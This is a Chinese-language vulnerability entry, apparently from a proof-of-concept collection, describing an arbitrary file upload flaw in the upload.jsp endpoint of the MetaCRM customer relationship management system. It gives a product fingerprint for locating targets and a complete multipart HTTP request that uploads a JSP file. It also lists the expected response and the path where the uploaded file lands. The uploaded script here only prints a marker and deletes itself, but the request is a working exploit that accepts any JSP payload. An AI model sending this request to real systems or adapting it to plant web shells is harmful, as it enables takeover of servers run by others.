﻿# MetaCRM客户关系管理系统 upload 任意文件上传漏洞

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：MetaCRM是一款智能平台化CRM软件，其upload.jsp接口存在任意文件上传漏洞，攻击者可通过改漏洞上传恶意脚本从而控制该系统。

> 漏洞特征：product="美特软件-MetaCRM6"

> 验证脚本：HTTP

```
POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
Connection: close

------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: text/plain

<% out.print("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="key"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="form"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="field"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="filetitile"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="filefolder"

null
------WebKitFormBoundary0Mh3BfgWszxRFokh--

```

> 响应代码特征：200

> 响应内容特征：dudesuite.jsp

> 上传文件定位：/userfile/default/userlogo/dudesuite.jsp

> 验证文件来源：MetaCRM客户关系管理系统 upload 任意文件上传漏洞.poc

